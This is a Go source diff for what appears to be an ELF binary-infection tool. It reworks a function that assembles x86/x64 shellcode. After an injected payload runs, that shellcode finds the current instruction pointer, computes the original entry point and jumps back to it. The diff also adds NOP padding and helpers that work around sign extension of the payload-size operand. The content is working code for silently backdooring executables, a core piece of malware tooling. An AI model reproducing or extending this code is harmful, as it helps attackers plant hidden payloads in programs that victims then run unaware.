@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"debug/elf"
 	"encoding/binary"
+	"math/bits"
 )
 
 var preserve64 = []byte{
@@ -124,60 +125,45 @@ x64 - pEntry uint64 / oEntry uint64
 x86 - pEntry uint32 / oEntry uint32
 */
 func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
-	/*
-		;Example of what the final payload can look like
-		epilog := []byte{
-			0xe8, 0x12, 0x00, 0x00, 0x00, 		//call   401061 <get_eip>
-			0x48, 0x83, 0xe8, 0x4f, 			//sub    $0x4f,%rax
-			0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
-			0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
-			0xff, 0xe0, 						//jmp    *%rax
-												//0000000000401061 <get_eip>:
-			0x48, 0x8b, 0x04, 0x24, 			//mov    (%rsp),%rax
-			0xc3, 								//ret
-		}
-	*/
+	//account for the call instruction we will prepend to the shellcode
+	pSize += 5
+
+	//if need be, adjust pSize to a value that doesn't have signed bit set
+	//mov rax, <imm> causes signed bit extension for values with a signed bit,
+	//this is a hack for dealing with it.
+	aPsize := adjustPsize(pSize)
 
 	encPsize := make([]byte, 4)
-	binary.LittleEndian.PutUint32(encPsize, uint32(pSize))
-	var numZeros uint32 = 0
-	for _, b := range encPsize {
-		if b != 0x00 {
-			numZeros++
-		}
-	}
-
-	var incOff uint32
-	switch pEntry.(type) {
-	case uint64:
-		incOff = 0x12
-	case uint32:
-		incOff = 0xf
-	}
-	incOff += (numZeros - 1)
+	binary.LittleEndian.PutUint32(encPsize, uint32(aPsize))
 
 	var shellcode bytes.Buffer
-	shellcode.Write([]byte{0xe8}) //call instruction
 
-	//encode the offset
-	encOff := make([]byte, 4)
-	binary.LittleEndian.PutUint32(encOff, incOff)
+	if aPsize != pSize {
+		var nopCount int
+		for nopCount = 0; signedInt32(pSize); pSize++ {
+			nopCount++
+		}
 
-	//write offset for call instruction
-	shellcode.Write(encOff)
+		for i := 0; i < nopCount; i++ {
+			shellcode.Write([]byte{0x90})
+		}
+	}
 
 	// (x64) - sub rax, encPsize
 	// (x86) - sub eax, encPsize
+
 	switch oEntry.(type) {
 	case uint64:
-		shellcode.Write([]byte{0x48, 0x83, 0xe8})
+		shellcode.Write([]byte{0x48, 0x2d})
 	case uint32:
-		shellcode.Write([]byte{0x83, 0xe8})
+		shellcode.Write([]byte{0x2d})
 	}
-	shellcode.Write(encPsize[:numZeros])
+
+	shellcode.Write(encPsize)
 
 	//	(x64) - sub rax, pEntry
 	//	(x86) - sub eax, pEntry
+
 	encPentry := make([]byte, 4)
 	switch v := pEntry.(type) {
 	case uint64:
@@ -187,10 +173,12 @@ func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
 		binary.LittleEndian.PutUint32(encPentry, v)
 		shellcode.Write([]byte{0x2d})
 	}
+
 	shellcode.Write(encPentry)
 
 	// (x64) - add rax, oEntry
 	// (x86) - add eax, oEntry
+
 	encOentry := make([]byte, 4)
 	switch v := oEntry.(type) {
 	case uint64:
@@ -200,6 +188,7 @@ func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
 		binary.LittleEndian.PutUint32(encOentry, v)
 		shellcode.Write([]byte{0x05})
 	}
+
 	shellcode.Write(encOentry)
 
 	switch oEntry.(type) {
@@ -216,5 +205,50 @@ func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
 		//ret
 		shellcode.Write([]byte{0xff, 0xe0, 0x8b, 0x04, 0x24, 0xc3})
 	}
-	return shellcode.Bytes()
+
+	jmpRaxOffset := bytes.LastIndexByte(shellcode.Bytes(), 0xff)
+
+	// mov [accumulator register] , [stack-pointer] will be two bytes after jmp [accumulator] instruction
+	getIPOff := jmpRaxOffset + 2
+	encOff := make([]byte, 4)
+
+	var callInst bytes.Buffer
+
+	//call instruction opcode
+	callInst.Write([]byte{0xe8})
+	//offset to get_eip
+	binary.LittleEndian.PutUint32(encOff, uint32(getIPOff))
+	callInst.Write(encOff)
+
+	//place the call as the first instruction of the shellcode
+	return append(callInst.Bytes(), shellcode.Bytes()...)
+}
+
+func adjustPsize(pSize int32) int32 {
+	for {
+		if !signedInt32(pSize) {
+			break
+		}
+		pSize++
+	}
+	return pSize
+}
+
+func signedInt32(n int32) bool {
+	switch getNoneZeroByteCount(n) {
+	case 1:
+		return (n & (int32(1) << 23)) == (int32(1) << 23)
+	case 2:
+		return (n & (int32(1) << 15)) == int32(1)<<15
+	case 3:
+		return (n & (int32(1) << 7)) == int32(1)<<7
+	}
+	return false
+}
+
+func getNoneZeroByteCount(n int32) (nonZeros int) {
+	numZeros := bits.LeadingZeros32(uint32(n))
+	zeroBytes := numZeros / 8
+	nonZeros = 4 - zeroBytes
+	return
 }
